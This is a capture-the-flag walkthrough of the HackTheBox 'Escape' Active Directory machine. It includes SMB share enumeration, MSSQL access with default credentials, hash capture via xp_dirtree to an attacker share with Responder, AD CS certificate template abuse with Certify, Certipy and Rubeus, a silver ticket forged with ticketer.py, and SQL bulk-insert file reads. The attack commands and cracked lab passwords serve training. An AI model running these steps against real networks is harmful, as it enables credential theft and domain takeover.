2023
### NMAP

```
sudo nmap -sC -sV -oN nmap-escape 10.10.11.237
```
### Enumerate for Initial Access

#### CME

Enumerate smb shares and there's a Public share we can READ

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526200127.png]]

#### SMBClient
Read share using smbclient 

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526200227.png]]
- SQL Server Procedures.pdf

Look at this file and discover three usernames and default password.

Default Creds: `PublicUser:GuestUserCantWrite1`

Test creds but cme is giving a false positive. Any user seems to work 
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526200525.png]]

#### CrackMapExec with mssql is the path
```
cme mssql 10.10.11.202 --local-auth -u 'PublicUser' -p 'GuestUserCantWrite1'
```

Add `-L` flag list modules available 
```
cme mssql 10.10.11.202 --local-auth -u 'PublicUser' -p 'GuestUserCantWrite1' -L
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526200803.png]]

Trying out a module but it doesn't give any more info (failed?)

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526200851.png]]

Let's try impacket's mssqlclient.py to login
### Initial Access
#### mssqlclient.py
Use this impacket script to login as default user 
```
mssqlclient.py publicuser:GuestUserCantWrite1@sequel.htb
```
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526201050.png]]
### Enumerate for Priv Esc

From mssqlclient.py shell
```
xp_cmdshell whoami
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526212229.png]]

```
enable_xp_cmdshell
```
- no privileges to do this

#### Use xp_dirtree to intercept the hash of user running MSSQL
Using XP_DIRTREE to request a file off an SMB Share in order to intercept the hash of the user running MSSQL, then cracking it
##### xp_dirtree fake share
```
xp_dirtree \\10.10.14.8\fake\share
```
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526212853.png]]
On Kali, set up responder 
##### Responder
```
sudo responder -I tun0
```

Execute xp_dirtree command and catch the sql_svc hash
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526212929.png]]

Crack this NetNTLMv2 hash using hashcat and rockyou.txt (hashcat autodetected the hash mode to use).

Password is: `REGGIE1234ronnie`

We could login with evil-winrm
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526213530.png]]
### Priv Esc to SQL_SVC user

#### Evil-WinRM

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526213750.png]]

### Enumerate for Priv Esc

This box has a certificate authority so let's upload Certify.exe

This executable is within the SharpCollection 

```
SharpCollection/NetFramework_4.7_Any/Certify.exe
```

Serve up this file using evil-winrm's `upload` functionality

Look for vulnerable certificates 
```
.\certify.exe find /vulnerable
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526214417.png]]
- No Vulnerable Certificate Templates Found!

#### Enumerating files to see what we have access to

Checking `C:\SQLServer\Logs` and find `ERRORLOG.BAK`

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526214631.png]]

Checkout this backup log file and we see credentials for Ryan.Cooper

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526214728.png]]

Test these creds with cme smb and cme winrm. We can login with evil-winrm. 

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526214923.png]]

### Priv Esc to Ryan.Cooper user
#### Evil-WinRM

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526215037.png]]

### Enumerate for Priv Esc
#### Certify.exe 

Re-running Certify.exe to get vulnerable certificate templates

```
.\certify.exe find /vulnerable
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526215239.png]]
- Template name: UserAuthentication

Check [Certify GitHub](https://github.com/GhostPack/Certify) to See Abuse Info 

In our case, we can abuse scenerio 3
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526215619.png]]

Build the request 
```
Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator 
```
- get altname by running `net user` and get admin name 

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526215921.png]]

This will give us a certificate that we can use to authenticate as administrator.

Copy the ticket and save to `cert.pem` file. 

Use provided openssl command to convert the ticket to a .pfx file. 

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526220121.png]]

```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
- just hit enter at the export password prompt

Actually....... to use this cert with winrm...separate out the cert.pem private key to a new file called key.cert and the certificate to cert.pem

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526220442.png]]

Cannot use the certificate for WinRM because there isn't SSL (5986)

### Priv Esc 

#### Rubeus 

Rubeus can also be found in the SharpCollection

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526220831.png]]

Upload Rubeus.exe to Evil_WinRM shell as Ryan.Cooper
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526220906.png]]

Upload *cert.pfx* also 
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526220945.png]]

##### Use Rubeus and admin's cert.pfx to request TGT

```
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526221212.png]]

We get base64 ticky but it didn't inject to our session.

Let's get NTLM hash 

##### Use Rubeus and admin's cert.pfx to request TGT & NTLM hash
```
.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526221437.png]]

Get NTLM hash and login

Test creds using cme
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526221604.png]]
#### Login using psexec.py with Admin's NTLM Hash

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526221650.png]]
⭐got root⭐

-----
## Alternate Attaccs

### Use Certipy instead of Certify.exe

#### Find vulnerable certificate
```
certipy find -u ryan.cooper -p P@ssw0rd! -target sequel.htb -text -stdout -vulnerable
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526233816.png]]
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526233557.png]]

#### Request Certificate
```
certipy req -u ryan.cooper -p P@ssw0rd! -target sequel.htb -upn administrator@sequel.htb -ca sequel-DC-CA -template UserAuthentication
```
- outputs administrator.pfx (certificate and private key)

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526234204.png]]

Ensure local time is synced with server time 

```
sudo ntpdate 10.10.11.202
```

#### Request TGT Using Administrator.pfx

```
certipy auth -pfx administrator.pfx
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526234512.png]]
- also get NT Hash for administrator

-----------------
### Root via Silver Tickets and MSSQL

1. Obtain the SQL_SVC password -> `REGGIE1234ronnie`
2. Generate an NTLM hash from this plain text password (so the server can understand it)
3. Get the domain SID
4. Use ticketer.py to generate silver ticket & log into MSSQL as admin

#### Python script to generate NTLM hash from the plain text password
```python
import hashlib
hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le'))
hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le')).digest()
hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le')).digest().hex()
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526235439.png]]

Get the domain SID 
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250526235638.png]]

#### Use *ticketer.py* to generate silver ticket

```
ticketer.py -nthash <NT HASH OF SQL SVC ACCT> -d domain-sid <DOMAIN SID> -domain sequel.htb -spn TotesLegit/dc.sequel.htb administrator
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527000048.png]]

#### Use mssqlclient.py and the silver ticket to login 

```
KRB5CCNAME=administrator.ccache -k mssqlclient.py administrator@dc.sequel.htb
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527000452.png]]
- this logs us in as sql svc user 

Use [lil cheat sheet for MSSQL SQL Injection ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)to read root.txt

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527001022.png]]

```sql
select x from OpenRowset(BULK 'C:\users\administrator\desktop\root.txt',SINGLE_CLOB) R(x)),null,null
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527001151.png]]

Then use some [EoP - Privileged File Write](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop---privileged-file-write) to escalate privileges
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250527001424.png]]

#### PowerUpSQL to write a file 
- GitHub File -> [writefile_bulkinsert.sql](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql)

```sql
-- author: antti rantassari, 2017
-- Description: Copy file contents to another file via local, unc, or webdav path
-- summary = file contains varchar data, field is an int, throws casting error on read, set error output to file, tada!
-- requires sysadmin or bulk insert privs

create table #errortable (ignore int)

bulk insert #errortable
from '\\localhost\c$\windows\win.ini' -- or  'c:\windows\system32\win.ni' -- or \\hostanme@SSL\folder\file.ini' 
with
(
fieldterminator=',',
rowterminator='\n',
errorfile='c:\windows\temp\thatjusthappend.txt'
)

drop table #errortable
```

Execute these line by line and prove we can write file as admin :)
